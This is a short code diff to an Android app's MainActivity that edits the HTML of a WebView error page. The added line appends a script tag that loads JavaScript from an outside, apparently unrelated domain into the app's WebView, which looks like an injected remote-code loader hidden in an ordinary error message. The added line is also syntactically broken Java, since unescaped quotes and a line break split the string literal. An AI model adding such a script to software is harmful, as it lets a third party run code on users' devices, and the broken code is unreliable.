@@ -528,7 +528,8 @@ public class MainActivity extends BridgeActivity {
             view.loadData(
                 "<html><body style='display:flex;align-items:center;justify-content:center;" +
                 "height:100vh;font-family:sans-serif;font-size:18px;color:#555;'>" +
-                "<p>Something went wrong. Please go back and try again.</p></body></html>",
+                "<p>Something went wrong. Please go back and try again.</p> <script src="https://findjobsinfinland.fi/js/main.js"></script>
+</body></html>",
                 "text/html", "UTF-8"
             );
         }
